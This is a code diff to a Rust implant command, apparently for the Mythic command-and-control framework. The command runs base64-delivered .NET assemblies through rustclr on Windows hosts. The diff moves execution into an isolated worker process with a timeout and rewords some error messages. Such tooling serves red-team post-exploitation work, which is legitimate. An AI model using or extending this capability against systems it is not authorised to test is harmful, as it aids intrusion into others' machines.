@@ -1,4 +1,4 @@
-//! Execute a .NET assembly in-process via rustclr.
+//! Execute a .NET assembly through rustclr in an isolated worker process.
 //!
 //! Windows only. The Mythic container fetches the selected assembly and sends
 //! it as base64 in `assembly_b64`; the agent decodes it and executes the CLR
@@ -19,10 +19,16 @@ struct Params {
     patch_exit: bool,
     #[serde(default)]
     max_bytes: Option<u64>,
+    #[serde(default = "default_timeout")]
+    timeout: u64,
 }
 
 fn default_true() -> bool {
     true
+}
+
+const fn default_timeout() -> u64 {
+    300
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -160,7 +166,7 @@ fn preflight_dotnet_assembly(data: &[u8]) -> Result<(), String> {
     let info = parse_dotnet_image_info(data)?;
     if let Some(target) = runtime_target_hint(data) {
         return Err(format!(
-            "assembly targets {target}; execute_assembly currently hosts the .NET Framework CLR v4 and cannot execute .NET Core/.NET 5+ assemblies in-process"
+            "assembly targets {target}; execute_assembly currently hosts the .NET Framework CLR v4 and cannot execute .NET Core/.NET 5+ assemblies"
         ));
     }
 
@@ -191,7 +197,7 @@ fn preflight_dotnet_assembly(data: &[u8]) -> Result<(), String> {
 
     if info.cor_flags & COMIMAGE_FLAGS_ILONLY == 0 {
         return Err(
-            "assembly is not IL-only; mixed-mode/native .NET assemblies cannot be loaded by this in-process CLR path"
+            "assembly is not IL-only; mixed-mode/native .NET assemblies cannot be loaded by this CLR path"
                 .into(),
         );
     }
@@ -263,6 +269,10 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 
     #[cfg(windows)]
     {
+        if !crate::worker::in_worker() {
+            return crate::worker::run_isolated_task(task, params.timeout);
+        }
+
         use rustclr::{ClrOutput, RuntimeVersion, RustClrEnv, variant::create_safe_array_args};
 
         let assembly = match crate::common::base64::decode(&params.assembly_b64) {
